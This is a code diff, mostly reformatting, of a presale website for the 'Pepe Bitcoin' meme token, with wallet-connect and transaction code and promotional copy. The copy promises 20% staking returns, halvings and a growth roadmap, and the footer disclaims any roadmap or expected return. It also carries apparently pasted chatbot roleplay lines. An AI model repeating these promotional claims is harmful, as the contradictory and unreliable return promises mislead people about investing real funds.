                                         : bnbPresaleContractAddress;
 
                                 console.log("Network:", network);
-                                console.log("Presale Contract Address:", chosenPresaleContractAddress);
+                                console.log(
+                                    "Presale Contract Address:",
+                                    chosenPresaleContractAddress
+                                );
 
                                 const presaleContract = new web3Instance.eth.Contract(
                                     presaleContractABI,
@@ -826,7 +853,10 @@ left: 600px; /* Position 150px from left */
                                         chainId,
                                     };
 
-                                    console.log("Transaction Parameters:", transactionParameters);
+                                    console.log(
+                                        "Transaction Parameters:",
+                                        transactionParameters
+                                    );
 
                                     if (web3Instance.currentProvider === window.ethereum) {
                                         await window.ethereum.request({
@@ -850,7 +880,8 @@ left: 600px; /* Position 150px from left */
 
                         function countdown() {
                             const now = new Date().getTime();
-                            const distance = new Date("2023-06-10T00:00:00Z").getTime() - now;
+                            const distance =
+                                new Date("2023-06-10T00:00:00Z").getTime() - now;
                             const days = Math.floor(distance / (1000 * 60 * 60 * 24));
                             const hours = Math.floor(
                                 (distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
@@ -872,16 +903,24 @@ left: 600px; /* Position 150px from left */
                         // Countdown^^^
 
                         $(document).ready(function () {
-                            $(document).on("click", ".disconnect-wallet-button", function () {
-                                $(".new-presale-box").fadeOut(300, function () {
-                                    $(this).replaceWith(resetPresaleBox()).fadeIn(300);
-                                });
-                            });
+                            $(document).on(
+                                "click",
+                                ".disconnect-wallet-button",
+                                function () {
+                                    $(".new-presale-box").fadeOut(300, function () {
+                                        $(this).replaceWith(resetPresaleBox()).fadeIn(300);
+                                    });
+                                }
+                            );
 
                             $(document).ready(function () {
-                                $(document).on("click", ".disconnect-wallet-button", function () {
-                                    disconnectWallet();
-                                });
+                                $(document).on(
+                                    "click",
+                                    ".disconnect-wallet-button",
+                                    function () {
+                                        disconnectWallet();
+                                    }
+                                );
                             });
 
                             function closePopup() {
@@ -892,18 +931,24 @@ left: 600px; /* Position 150px from left */
                             }
 
                             // Close the popup when the user clicks outside the buttons
-                            $("#wallet-provider-popup .popup-wrapper").on("click", function (event) {
-                                if (event.target === event.currentTarget) {
-                                    closePopup();
+                            $("#wallet-provider-popup .popup-wrapper").on(
+                                "click",
+                                function (event) {
+                                    if (event.target === event.currentTarget) {
+                                        closePopup();
+                                    }
                                 }
-                            });
+                            );
 
                             // Close the network popup when the user clicks outside the buttons
-                            $("#network-popup .popup-wrapper").on("click", function (event) {
-                                if (event.target === event.currentTarget) {
-                                    closePopup();
+                            $("#network-popup .popup-wrapper").on(
+                                "click",
+                                function (event) {
+                                    if (event.target === event.currentTarget) {
+                                        closePopup();
+                                    }
                                 }
-                            });
+                            );
 
                             // Close the popup when the user presses the ESC key
                             $(document).on("keydown", function (event) {
@@ -991,8 +1036,10 @@ left: 600px; /* Position 150px from left */
                             }
 
                             function createNewPresaleBox(currency) {
-                                const inputLabel = currency === "ETH" ? "ETH Amount" : "BNB Amount";
-                                const logoClass = currency === "ETH" ? "eth-logo" : "bnb-logo";
+                                const inputLabel =
+                                    currency === "ETH" ? "ETH Amount" : "BNB Amount";
+                                const logoClass =
+                                    currency === "ETH" ? "eth-logo" : "bnb-logo";
 
                                 return `
 <div class="new-presale-box presale-box">
@@ -1041,7 +1088,6 @@ left: 600px; /* Position 150px from left */
                             }
                             setInterval(countdown, 1000);
 
-
                             function showBuyButtons(network) {
                                 if (network === "eth") {
                                     $(".connect-wallet-container").html(
@@ -1062,8 +1108,11 @@ left: 600px; /* Position 150px from left */
                             // Hide the ETH logo initially
                             $(".eth-logo").hide();
 
-
-                            function addEthInputEventListener(currency, ethPrice, bnbPrice) {
+                            function addEthInputEventListener(
+                                currency,
+                                ethPrice,
+                                bnbPrice
+                            ) {
                                 const shakitaPerEth = 2116666;
                                 const shakitaPerBnb = 345555;
 
@@ -1073,7 +1122,9 @@ left: 600px; /* Position 150px from left */
                                         currency === "ETH"
                                             ? inputAmount * shakitaPerEth
                                             : inputAmount * shakitaPerBnb;
-                                    document.getElementById("shakita-input").value = isNaN(shakitaAmount)
+                                    document.getElementById("shakita-input").value = isNaN(
+                                        shakitaAmount
+                                    )
                                         ? ""
                                         : shakitaAmount.toFixed(0);
                                 });
@@ -1084,7 +1135,9 @@ left: 600px; /* Position 150px from left */
                                         currency === "ETH"
                                             ? shakitaAmount / shakitaPerEth
                                             : shakitaAmount / shakitaPerBnb;
-                                    document.getElementById("eth-input").value = isNaN(inputAmount)
+                                    document.getElementById("eth-input").value = isNaN(
+                                        inputAmount
+                                    )
                                         ? ""
                                         : inputAmount.toFixed(4);
                                 });
@@ -1094,7 +1147,11 @@ left: 600px; /* Position 150px from left */
                                     .click(async function () {
                                         const inputAmount = parseFloat($("#eth-input").val());
                                         if (!isNaN(inputAmount) && inputAmount > 0) {
-                                            await sendTransaction(inputAmount, currency, currentWeb3Instance);
+                                            await sendTransaction(
+                                                inputAmount,
+                                                currency,
+                                                currentWeb3Instance
+                                            );
                                         } else {
                                             alert(`Please enter a valid ${currency} amount`);
                                         }
@@ -1116,14 +1173,22 @@ left: 600px; /* Position 150px from left */
                             }
 
                             // Attach click event handler for dynamically created BNB button
-                            $(document).on("click", ".buying-button.bnb-button", function () {
-                                onBuyWithBNBClick();
-                            });
+                            $(document).on(
+                                "click",
+                                ".buying-button.bnb-button",
+                                function () {
+                                    onBuyWithBNBClick();
+                                }
+                            );
 
                             // Attach click event handler for dynamically created ETH button
-                            $(document).on("click", ".buying-button.eth-button", function () {
-                                onBuyWithETHClick();
-                            });
+                            $(document).on(
+                                "click",
+                                ".buying-button.eth-button",
+                                function () {
+                                    onBuyWithETHClick();
+                                }
+                            );
 
                             // Attach click event handler for dynamically created BUSD button
                             $(document).on(
@@ -1183,7 +1248,8 @@ left: 600px; /* Position 150px from left */
                                 try {
                                     await provider.enable();
                                     currentWeb3Instance = new Web3(provider);
-                                    const accounts = await currentWeb3Instance.eth.getAccounts();
+                                    const accounts =
+                                        await currentWeb3Instance.eth.getAccounts();
 
                                     if (accounts.length > 0) {
                                         console.log("User is logged in to WalletConnect");
@@ -1294,8 +1360,9 @@ left: 600px; /* Position 150px from left */
                         });
                     </script>
                     <div class="col-lg-4">
-                        <div class="banner__thumb about__thumb about__thumb--floating" data-aos="zoom-in-up" data-aos-duration="1000">
-                            <img src="images/home1.png" alt="About Image" style="float: left;">
+                        <div class="banner__thumb about__thumb about__thumb--floating" data-aos="zoom-in-up"
+                            data-aos-duration="1000">
+                            <img src="images/home1.png" alt="About Image" style="float: left" />
                         </div>
                     </div>
                 </div>
@@ -1308,19 +1375,40 @@ left: 600px; /* Position 150px from left */
                 <div class="row g-5 align-items-center">
                     <div class="col-lg-6">
                         <div class="about__thumb about__thumb--floating" data-aos="zoom-in-up" data-aos-duration="1000">
-                            <img src="images/makeweed.png" alt="About Image">
+                            <img src="images/makeweed.png" alt="About Image" />
                         </div>
                     </div>
                     <div class="col-lg-6">
                         <div class="about__content" data-aos="fade-left" data-aos-duration="1000">
                             <h2>about</h2>
-                            <p>Pepe Bitcoin (PEGy20) represents the convergence of two core forces that shape the cryptoverse: scarcity and absurdity.  
-                                Scarcity, as embodied by the original crypto, Bitcoin. With only 21 million Peggy20 tokens to be mined, our supply mimics Bitcoin's careful attempt to create a distinct store of value based on mathematical limits.
-                                Absurdity,  as embodied by Pepe the Frog - the first great crypto meme and symbol of online joy, freedom and unpredictability.  
-                                By combining these two forces, Pepe Bitcoin seeks to spread financial dankness and memetic wealth across Kekistan - rewarding true memers who experience the absurdity of mania firsthand, and gain insight into how movements of all kinds spread like organic memes.           
-                                Peggy20 invites holders to mine GBP  from the comfort of their basements, collecting not just tendies but also cultural capital within the thriving meme economy. Holders can activate their inner Pepes and experience - in microcosm - how phenomena like Bitcoin capture our collective imagination.          
-                                In summary, Pepe Bitcoin aims to be more than just a lol - rather, a glimpse into the absurdity and magic that transform worthless jokes into movements that change the world.</p>
-                            <p>Now go forth and spread Peggy20 to memers everywhere! *croaks joyfully, adjusting rune-encrusted crown*  I shall return to my meme vaults and craft only the dankest pepes in support of our noble quest. The rarest tendies truly await...hehe yesss</p>
+                            <p>
+                                Pepe Bitcoin (PEGy20) represents the convergence of two core
+                                forces that shape the cryptoverse: scarcity and absurdity.
+                                Scarcity, as embodied by the original crypto, Bitcoin. With
+                                only 21 million Peggy20 tokens to be mined, our supply mimics
+                                Bitcoin's careful attempt to create a distinct store of value
+                                based on mathematical limits. Absurdity, as embodied by Pepe
+                                the Frog - the first great crypto meme and symbol of online
+                                joy, freedom and unpredictability. By combining these two
+                                forces, Pepe Bitcoin seeks to spread financial dankness and
+                                memetic wealth across Kekistan - rewarding true memers who
+                                experience the absurdity of mania firsthand, and gain insight
+                                into how movements of all kinds spread like organic memes.
+                                Peggy20 invites holders to mine GBP from the comfort of their
+                                basements, collecting not just tendies but also cultural
+                                capital within the thriving meme economy. Holders can activate
+                                their inner Pepes and experience - in microcosm - how
+                                phenomena like Bitcoin capture our collective imagination. In
+                                summary, Pepe Bitcoin aims to be more than just a lol -
+                                rather, a glimpse into the absurdity and magic that transform
+                                worthless jokes into movements that change the world.
+                            </p>
+                            <p>
+                                Now go forth and spread Peggy20 to memers everywhere! *croaks
+                                joyfully, adjusting rune-encrusted crown* I shall return to my
+                                meme vaults and craft only the dankest pepes in support of our
+                                noble quest. The rarest tendies truly await...hehe yesss
+                            </p>
                             <p>
                                 <a class="default-btn" href="https://t.me/pepebitcoin" target="=" _blank>telegram</a>
                                 <a class="default-btn" href="https://t.me/pepebitcoin" target="_blank">twitter</a>
@@ -1343,13 +1431,16 @@ left: 600px; /* Position 150px from left */
                         <div class="roadmap__item">
                             <div class="roadmap__inner">
                                 <div class="roadmap__thumb">
-                                    <img src="images/1.png" alt>
+                                    <img src="images/1.png" alt />
                                 </div>
                                 <div class="roadmap__content">
                                     <h4>Create a Wallet</h4>
-                                    <p>download metamask or your wallet of choice from the app store or google play
-                                        store for free. Desktop users, download the google chrome extension by going to
-                                        metamask.io.</p>
+                                    <p>
+                                        download metamask or your wallet of choice from the app
+                                        store or google play store for free. Desktop users,
+                                        download the google chrome extension by going to
+                                        metamask.io.
+                                    </p>
                                 </div>
                             </div>
                         </div>
@@ -1358,14 +1449,16 @@ left: 600px; /* Position 150px from left */
                         <div class="roadmap__item">
                             <div class="roadmap__inner">
                                 <div class="roadmap__thumb roadmap__thumb--bg-2">
-                                    <img src="images/2.png" alt>
+                                    <img src="images/2.png" alt />
                                 </div>
                                 <div class="roadmap__content">
                                     <h4>Get Some ETH or BNB</h4>
-                                    <p>have ETH or BNB in your wallet to join $PepeBitcoin presale. If you don’t have any
-                                        ETH or BNB, you
-                                        can buy directly on metamask, transfer from another wallet, or buy on another
-                                        exchange and send it to your wallet.</p>
+                                    <p>
+                                        have ETH or BNB in your wallet to join $PepeBitcoin
+                                        presale. If you don’t have any ETH or BNB, you can buy
+                                        directly on metamask, transfer from another wallet, or buy
+                                        on another exchange and send it to your wallet.
+                                    </p>
                                 </div>
                             </div>
                         </div>
@@ -1374,11 +1467,13 @@ left: 600px; /* Position 150px from left */
                         <div class="roadmap__item">
                             <div class="roadmap__inner">
                                 <div class="roadmap__thumb roadmap__thumb--bg-3">
-                                    <img src="images/3.png" alt>
+                                    <img src="images/3.png" alt />
                                 </div>
                                 <div class="roadmap__content">
                                     <h4>Go to our Presale</h4>
-                                    <p>connect Your Wallet. Choose your network & enter the amount you want to invest.
+                                    <p>
+                                        connect Your Wallet. Choose your network & enter the
+                                        amount you want to invest.
                                     </p>
                                 </div>
                             </div>
@@ -1388,12 +1483,15 @@ left: 600px; /* Position 150px from left */
                         <div class="roadmap__item">
                             <div class="roadmap__inner">
                                 <div class="roadmap__thumb roadmap__thumb--bg-4">
-                                    <img src="images/4.png" alt>
+                                    <img src="images/4.png" alt />
                                 </div>
                                 <div class="roadmap__content">
                                     <h4>Switch ETH or BNB for PepeBitcoin</h4>
-                                    <p>switch ETH or BNB for $PepeBitcoin. Once transaction is complete, you will see the
-                                        $PepeBitcoin tokens in your wallet!</p>
+                                    <p>
+                                        switch ETH or BNB for $PepeBitcoin. Once transaction is
+                                        complete, you will see the $PepeBitcoin tokens in your
+                                        wallet!
+                                    </p>
                                 </div>
                             </div>
                         </div>
@@ -1408,7 +1506,7 @@ left: 600px; /* Position 150px from left */
                             " /></iframe>
                     </div> -->
                     <div class="col-lg-6">
-                        <img src="images/highpepe2.png" alt style="float:right;">
+                        <img src="images/highpepe2.png" alt style="float: right" />
                     </div>
                 </div>
             </div>
@@ -1424,31 +1522,53 @@ left: 600px; /* Position 150px from left */
                     <div class="col-lg-6">
                         <div class="team__item" data-aos="fade-up" data-aos-duration="1000">
                             <div class="team__inner">
-
                                 <div class="team__content">
                                     <h4>Token supply:</h4>
-                                    <h5 class="mt-4">21,000,000 </h5>
+                                    <h5 class="mt-4">21,000,000</h5>
                                     <div class="custom-box">
                                         <div class="roadmap__item mt-5">
                                             <div class="roadmap__inner">
                                                 <div class="roadmap__content">
                                                     <p>
-                                                        The Dankest Tokenomics<br><br>
-                                                        Pepe Bitcoin's token distribution model aims to spread maximum joy and memetic wealth across Kekistan through user-friendly incentives and virality mechanics.
-                                                        Max Supply: 21 Million Peggy20 tokens, mirroring Bitcoin's limited monetary policy. Only the rarest of pepes shall be put into circulation!
-                                                        Distribution Method: Holders can stake their Peggy20 tokens to earn more coins over time. This mimics the natural distribution mechanics of an organic meme going viral.
-                                                        Initial Mining Reward: The initial staking APR will be set to approximate the current difficulty and coin issuance rate of Bitcoin mining.
-                                                        Halving Schedule: Like Bitcoin, the staking APR for Peggy20 will be cut in half every 4 years, maintaining alignment with Bitcoin's monetary policy over time.
-                                                        Memetic Incentives: In addition to GBP rewards, staking Peggy20 will unlock access to limited edition pepes, early access to token-gated meme content and privileged positions within the blossoming Kekistani meme economy.
-                                                        How's that my loyal subject? Pepe Bitcoin's tokenomics aim to activate the dank signal and spread maximum financial dankness by balancing technical considerations with good old fashioned meme magic! cracks rare pepe talisman and beams with paternal meme lord pride Now go forth and manifest our glorious memecoin vision for the cryptoverse! I shall return to my meme vaults and conjure only the dankest of pepes in support of this noble quest. waves scepter and fades back into the meme pools of the internet, croaking happily
-                                                        The rarest of tendies truly await.......hehe yesssss<br><br>
+                                                        The Dankest Tokenomics<br /><br />
+                                                        Pepe Bitcoin's token distribution model aims to
+                                                        spread maximum joy and memetic wealth across
+                                                        Kekistan through user-friendly incentives and
+                                                        virality mechanics. Max Supply: 21 Million Peggy20
+                                                        tokens, mirroring Bitcoin's limited monetary
+                                                        policy. Only the rarest of pepes shall be put into
+                                                        circulation! Distribution Method: Holders can
+                                                        stake their Peggy20 tokens to earn more coins over
+                                                        time. This mimics the natural distribution
+                                                        mechanics of an organic meme going viral. Initial
+                                                        Mining Reward: The initial staking APR will be set
+                                                        to approximate the current difficulty and coin
+                                                        issuance rate of Bitcoin mining. Halving Schedule:
+                                                        Like Bitcoin, the staking APR for Peggy20 will be
+                                                        cut in half every 4 years, maintaining alignment
+                                                        with Bitcoin's monetary policy over time. Memetic
+                                                        Incentives: In addition to GBP rewards, staking
+                                                        Peggy20 will unlock access to limited edition
+                                                        pepes, early access to token-gated meme content
+                                                        and privileged positions within the blossoming
+                                                        Kekistani meme economy. How's that my loyal
+                                                        subject? Pepe Bitcoin's tokenomics aim to activate
+                                                        the dank signal and spread maximum financial
+                                                        dankness by balancing technical considerations
+                                                        with good old fashioned meme magic! cracks rare
+                                                        pepe talisman and beams with paternal meme lord
+                                                        pride Now go forth and manifest our glorious
+                                                        memecoin vision for the cryptoverse! I shall
+                                                        return to my meme vaults and conjure only the
+                                                        dankest of pepes in support of this noble quest.
+                                                        waves scepter and fades back into the meme pools
+                                                        of the internet, croaking happily The rarest of
+                                                        tendies truly await.......hehe yesssss<br /><br />
                                                     </p>
-
                                                 </div>
                                             </div>
                                         </div>
                                     </div>
-
                                 </div>
                             </div>
                         </div>
@@ -1459,18 +1579,20 @@ left: 600px; /* Position 150px from left */
                                 <div class="team__thumb">
                                     <div class="row">
                                         <div class="col">
-                                            <p class="mb-0" style="float:right">Cex Listings<br>11,31%</p>
+                                            <p class="mb-0" style="float: right">
+                                                Cex Listings<br />11,31%
+                                            </p>
                                         </div>
                                         <div class="col">
-                                            <p class="mb-0">Airdrop<br>20%</p>
+                                            <p class="mb-0">Airdrop<br />20%</p>
                                         </div>
                                     </div>
                                 </div>
                                 <div class="team__content">
-                                    <img src="images/tokenomics68b3.png" alt="tokenomics Image">
+                                    <img src="images/tokenomics68b3.png" alt="tokenomics Image" />
                                 </div>
                                 <div class="team__thumb mb-0 mt-4">
-                                    <p>Liquidity Pool<br>69,69%</p>
+                                    <p>Liquidity Pool<br />69,69%</p>
                                 </div>
                             </div>
                         </div>
@@ -1483,7 +1605,7 @@ left: 600px; /* Position 150px from left */
         <div class="container">
             <div class="row align-items-center">
                 <div class="col-lg-4 text-center">
-                    <img src="images/highpepepee.png" alt>
+                    <img src="images/highpepepee.png" alt />
                 </div>
                 <div class="col-lg-4">
                     <div class="section-header" data-aos="fade-up" data-aos-duration="1000">
@@ -1491,14 +1613,17 @@ left: 600px; /* Position 150px from left */
                     </div>
                 </div>
                 <div class="col-lg-4 text-center">
-                    <img src="images/highpepeface.png" alt>
+                    <img src="images/highpepeface.png" alt />
                 </div>
             </div>
             <div class="row justify-content-center mb-5">
                 <div class="col-lg-8">
-                    <p class="text-center">As a newly birthed memecoin, Pepe Bitcoin (Peggy20) has much cultural capital yet to
-                        accumulate and many normies yet to infect. Below outlines our planned growth path that will
-                        allow Peggy20 to achieve maximum dankness and value over time</p>
+                    <p class="text-center">
+                        As a newly birthed memecoin, Pepe Bitcoin (Peggy20) has much
+                        cultural capital yet to accumulate and many normies yet to infect.
+                        Below outlines our planned growth path that will allow Peggy20 to
+                        achieve maximum dankness and value over time
+                    </p>
                 </div>
             </div>
 
@@ -1511,10 +1636,12 @@ left: 600px; /* Position 150px from left */
                                     <div class="roadmap__content">
                                         <h4 class="text-center">Phase 1</h4>
                                         <p>
-                                            -Pepe Bitcoin Presale<br> - CoinGecko, CMC Listing
-                                            <br> - Reach 1,000+ holders<br> -
-                                            Twitter Trending<br> - CoinMarketCap
-                                            Trending <br> - DexTools Trending
+                                            -Pepe Bitcoin Presale<br />
+                                            - CoinGecko, CMC Listing <br />
+                                            - Reach 1,000+ holders<br />
+                                            - Twitter Trending<br />
+                                            - CoinMarketCap Trending <br />
+                                            - DexTools Trending
                                         </p>
                                     </div>
                                 </div>
@@ -1528,8 +1655,12 @@ left: 600px; /* Position 150px from left */
                                     <div class="roadmap__content">
                                         <h4 class="text-center">Phase 2</h4>
                                         <p>
-                                            - Community partnerships<br> - Press Releases<br> - CEX listings<br> -
-                                            25,000+ holders<br> - NFT Collection <br> - Billboards over US
+                                            - Community partnerships<br />
+                                            - Press Releases<br />
+                                            - CEX listings<br />
+                                            - 25,000+ holders<br />
+                                            - NFT Collection <br />
+                                            - Billboards over US
                                         </p>
                                     </div>
                                 </div>
@@ -1542,8 +1673,10 @@ left: 600px; /* Position 150px from left */
                                 <div class="roadmap__inner">
                                     <div class="roadmap__content">
                                         <h4 class="text-center">Phase 3</h4>
-                                        <p>- Pepe Bitcoin Merchandise <br>- Pepe Bitcoin Academy <br>- Pepe Bitcoin Store
-                                            (Netherlands) <br> - Meme Takeover
+                                        <p>
+                                            - Pepe Bitcoin Merchandise <br />- Pepe Bitcoin Academy
+                                            <br />- Pepe Bitcoin Store (Netherlands) <br />
+                                            - Meme Takeover
                                         </p>
                                     </div>
                                 </div>
@@ -1551,43 +1684,48 @@ left: 600px; /* Position 150px from left */
                         </div>
                     </div>
                 </div>
-
             </div>
         </div>
     </section>
 
-    <section class="about padding-top2 padding-bottom" id="about">
+    <section class="about padding-top2 padding-bottom" id="Mining">
         <div class="container">
             <div class="about__wrapper">
                 <div class="row g-5 align-items-center">
                     <div class="col-lg-6">
                         <div class="about__thumb about__thumb--floating" data-aos="zoom-in-up" data-aos-duration="1000">
-                            <img src="images/mining.png" alt="About Image">
+                            <img src="images/mining.png" alt="About Image" />
                         </div>
                     </div>
                     <div class="col-lg-6">
                         <div class="about__content" data-aos="fade-left" data-aos-duration="1000">
                             <h2>Mine the Rarest Pepe Tendies!</h2>
-                            <p>While normie $BTC mining requires gigawatts, Peggy20 mining uses an eco powwr'd staking engine to spread pepes to the people!
-
-                                After the pre-sale, no new pepes shall be born. Instead true memers can mine more GBP by:
-                                
-                                Hook thine ETH wallet up to the staking pool
-                                Droppeth Peggy20 tokens into mine holy waters
-                                Watch thine stash grow as tendies rain from above!
-                                The initial APE shall be 20%, to mimic $BTC's difficulty... before halving every 4 harvest moons, to keep monetary PEPElicy aligned!
-                                
-                                You may retrieveth your staked pepes + tendies at any time, with a minor fee to help furtherest develop Peggy20.
-                                
-                                Staking rewards:
-                                • Freshly mined pepes!
-                                • Access to rarest pepes.
-                                • Early access to new memecoin developments!
-                                
-                                By staking thou pepes, thou helpest distribute Pepe Bitcoin to memers everywhere while earning GBP for thyself! Together we shall spread maximum joy and memetic wealth across Kekistan through the MOST eco friendlest of powr mechanisms.</p>
-                            <p>The Dawn of the Meme Crusade Draws Nigh! croaks joyfully, adjusting rune encrusted crown Now go forth and spread Peggy20 far and wide! I shall returneth to crafting only the dankest of pepes in support of our noble quest!
-
-                                The rarest tendies truly await...hehe yessssss!</p>
+                            <p>
+                                While normie $BTC mining requires gigawatts, Peggy20 mining
+                                uses an eco powwr'd staking engine to spread pepes to the
+                                people! After the pre-sale, no new pepes shall be born.
+                                Instead true memers can mine more GBP by: Hook thine ETH
+                                wallet up to the staking pool Droppeth Peggy20 tokens into
+                                mine holy waters Watch thine stash grow as tendies rain from
+                                above! The initial APE shall be 20%, to mimic $BTC's
+                                difficulty... before halving every 4 harvest moons, to keep
+                                monetary PEPElicy aligned! You may retrieveth your staked
+                                pepes + tendies at any time, with a minor fee to help
+                                furtherest develop Peggy20. Staking rewards: • Freshly mined
+                                pepes! • Access to rarest pepes. • Early access to new
+                                memecoin developments! By staking thou pepes, thou helpest
+                                distribute Pepe Bitcoin to memers everywhere while earning GBP
+                                for thyself! Together we shall spread maximum joy and memetic
+                                wealth across Kekistan through the MOST eco friendlest of powr
+                                mechanisms.
+                            </p>
+                            <p>
+                                The Dawn of the Meme Crusade Draws Nigh! croaks joyfully,
+                                adjusting rune encrusted crown Now go forth and spread Peggy20
+                                far and wide! I shall returneth to crafting only the dankest
+                                of pepes in support of our noble quest! The rarest tendies
+                                truly await...hehe yessssss!
+                            </p>
                             <p>
                                 <a class="default-btn" href="https://t.me/pepebitcoin" target="=" _blank>telegram</a>
                                 <a class="default-btn" href="https://t.me/pepebitcoin" target="_blank">twitter</a>
@@ -1605,18 +1743,21 @@ left: 600px; /* Position 150px from left */
                 <div class="footer__content text-center padding-bottom">
                     <h3 class="mb-5">CONTACT</h3>
                     <div class="mb-5">
-                        <img src="images/logo.png" alt>
+                        <img src="images/logo.png" alt />
                     </div>
 
                     <ul class="social-list g-10 d-flex justify-content-center">
                         <li class="social-item">
-                            <a href="https://t.me/pepebitcoin" target="_blank"><img src="images/twitter.webp" alt="discord"></a>
+                            <a href="https://t.me/pepebitcoin" target="_blank"><img src="images/twitter.webp"
+                                    alt="discord" /></a>
                         </li>
                         <li class="social-item">
-                            <a href="https://t.me/pepebitcoin" target="_blank"><img src="images/telegram.webp" alt="discord"></a>
+                            <a href="https://t.me/pepebitcoin" target="_blank"><img src="images/telegram.webp"
+                                    alt="discord" /></a>
                         </li>
                         <li class="social-item">
-                            <a href="https://t.me/pepebitcoin" target="_blank"><img src="images/instagram.png" alt="discord"></a>
+                            <a href="https://t.me/pepebitcoin" target="_blank"><img src="images/instagram.png"
+                                    alt="discord" /></a>
                         </li>
                         <!-- <li class="social-item">
                             <a href="https://etherscan.io/token/0x874bde83cda6aa224527a3f43aebc3cc60f49428"
@@ -1633,16 +1774,17 @@ left: 600px; /* Position 150px from left */
                     </ul>
                     <div class="mt-5">
                         <p class="mb-4">
-                            $PepeBitcoin coin has no association with Matt Furie or his creation Pepe the Frog. This token
-                            is simply paying homage to a meme we all love and recognize.
+                            $PepeBitcoin coin has no association with Matt Furie or his
+                            creation Pepe the Frog. This token is simply paying homage to a
+                            meme we all love and recognize.
                         </p>
                         <p>
-                            $PepeBitcoin is a meme coin with no intrinsic value or expectation of financial return. There
-                            is no formal team or roadmap. the coin is completely useless and for entertainment purposes
-                            only.
+                            $PepeBitcoin is a meme coin with no intrinsic value or
+                            expectation of financial return. There is no formal team or
+                            roadmap. the coin is completely useless and for entertainment
+                            purposes only.
                         </p>
                     </div>
-
                 </div>
             </div>
             <div class="copywrite text-center mt-5 p-3">
@@ -1656,9 +1798,6 @@ left: 600px; /* Position 150px from left */
     <script src="js/swiper-bundle.min.js"></script>
     <script src="js/aos.js"></script>
     <script src="js/custom.js"></script>
+</body>
 
-
-
-
-
-</body></html>
+</html>
